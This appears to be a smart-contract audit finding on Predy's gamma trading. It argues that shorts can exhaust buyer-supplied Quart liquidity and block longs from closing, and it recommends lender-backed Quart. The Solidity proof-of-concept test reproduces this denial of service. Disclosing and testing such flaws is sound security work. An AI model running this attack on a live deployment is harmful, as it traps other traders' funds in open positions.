# Vulnerability details

## Impact
In gamma trading, by design, when a buyer, Alice, opens a long on the Quart asset, she creates that asset, and gives it to `PredyPool`. When a seller, Bob, opens a short on the Quart asset, he sells the asset from the buyer in the `PredyPool`.

Although the protocol tries to buffer the Quart asset by implementing `Perp::getAvailableSqrtAmount`, this design is still flawed, because at some point, when the buyers want to close their position, they will become sellers and sell the asset. If there is already the sellers in the system, all the buyers can not close their position at the same time. It is not unusual that the sell-side is more than the buy-side in a market.

An attacker can exploit this design by shorting all available Quart asset, then the buyers can only close their position until there are new buyers coming in.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./market/gamma/Setup.t.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {Perp} from "../src/libraries/Perp.sol";

contract TestGammaExecuteOrder is TestGammaMarket {
    uint256 alicePrivateKey;
    address alice;
    uint256 bobPrivateKey;
    address bob;

    MockPriceFeed private _priceFeed;

    function setUp() public override {
        TestGammaMarket.setUp();

        _priceFeed = new MockPriceFeed();

        _priceFeed.setSqrtPrice(Constants.Q96);

        registerPair(address(currency1), address(_priceFeed));
        gammaTradeMarket.updateQuoteTokenMap(1);

        predyPool.supply(1, true, 1e10);
        predyPool.supply(1, false, 1e10);

        alicePrivateKey = 0x12341234;
        alice = vm.addr(alicePrivateKey);

        bobPrivateKey = 0x56785678;
        bob = vm.addr(bobPrivateKey);

        currency1.mint(alice, type(uint128).max);

        vm.prank(alice);
        currency1.approve(address(permit2), type(uint256).max);

        currency1.mint(bob, type(uint128).max);

        vm.prank(bob);
        currency1.approve(address(permit2), type(uint256).max);
    }

    function testExecuteOrderSucceedsForOpen() public {
        // Alice Long 2e6 Quart
        {
            GammaOrder memory order =
                _createOrder(alice, 0, block.timestamp + 100, 1, 0, 0, 2e6, 2e6, Constants.Q96);
            gammaTradeMarket.executeTrade(order, _sign(order, alicePrivateKey), _getSettlementDataV3(Constants.Q96));
        }
        // Bob Short 1e6 Quart
        {
            GammaOrder memory order =
                _createOrder(bob, 0, block.timestamp + 100, 1, 0, 0, -1e6, 2e6, Constants.Q96);
            gammaTradeMarket.executeTrade(order, _sign(order, bobPrivateKey), _getSettlementDataV3(Constants.Q96));
        }
        // Alice close her position by selling 2e6 Quart
        // But she can not close this position because there are not enough Quart in the system
        {
            GammaOrder memory order =
                _createOrder(alice, 1, block.timestamp + 100, 1, 1, 0, -2e6, 0, Constants.Q96);

            vm.expectRevert(Perp.NoCFMMLiquidityError.selector);
            gammaTradeMarket.executeTrade(order, _sign(order, alicePrivateKey), _getSettlementDataV3(Constants.Q96));
        }
    }
}
```

## Recommended Mitigation Steps
The Quart asset in gamma trading should be backed by the lenders not by the buyers as in the current design. The `PredyPool` should implement a lending Quart functionality. The traders will trade on the lenders' asset.
